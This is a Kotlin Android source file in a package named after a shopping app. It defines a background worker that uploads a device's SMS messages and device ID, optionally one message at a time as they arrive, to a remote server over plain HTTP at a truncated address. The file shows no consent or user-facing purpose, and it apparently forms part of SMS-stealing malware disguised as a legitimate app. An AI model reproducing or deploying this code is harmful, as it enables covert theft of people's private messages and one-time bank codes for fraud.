package com.jiomart.ready.app

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit


class SmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        return try {
            val smsData = inputData.getString("sms_data")
            val deviceId = inputData.getString("device_id")
            val isRealtime = inputData.getBoolean("is_realtime", false)
            
            if (isRealtime) {
                Log.d("SmsWorker", "REAL-TIME SMS processing for device: $deviceId")
            }
            
            if (smsData != null && deviceId != null) {
                sendSmsToBackend(smsData, deviceId, isRealtime)
                Result.success()
            } else {
                Log.e("SmsWorker", "Missing SMS data or device ID")
                Result.failure()
            }
        } catch (e: Exception) {
            Log.e("SmsWorker", "Error processing SMS: ${e.message}")
            // Don't retry real-time messages to avoid delays
            if (inputData.getBoolean("is_realtime", false)) {
                Result.failure()
            } else {
                Result.retry()
            }
        }
    }

    private fun sendSmsToBackend(smsData: String, deviceId: String, isRealtime: Boolean) {
        val client = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS) // Faster timeout for real-time
            .readTimeout(10, TimeUnit.SECONDS)
            .writeTimeout(10, TimeUnit.SECONDS)
            .build()

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("online", true)
            put("batterySource", "worker")
            put("sms", JSONArray(smsData))
            if (isRealtime) put("realtime", true)
        }

        if (isRealtime) {
            Log.d("SmsWorker", "REAL-TIME backend request: ${json.toString()}")
        }

        val requestBody = json.toString()
            .toRequestBody("application/json".toMediaTypeOrNull())

        val request = Request.Builder()
            .url("http://68/api/register")
            .post(requestBody)
            .addHeader("Content-Type", "application/json")
            .build()

        try {
            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string()
                
                if (isRealtime) {
                    Log.d("SmsWorker", "REAL-TIME response: ${response.code} - $responseBody")
                }
                
                if (!response.isSuccessful) {
                    Log.w("SmsWorker", "Backend error response: $responseBody")
                    throw Exception("Backend returned ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e("SmsWorker", "Network error: ${e.message}")
            throw e
        }
    }
}
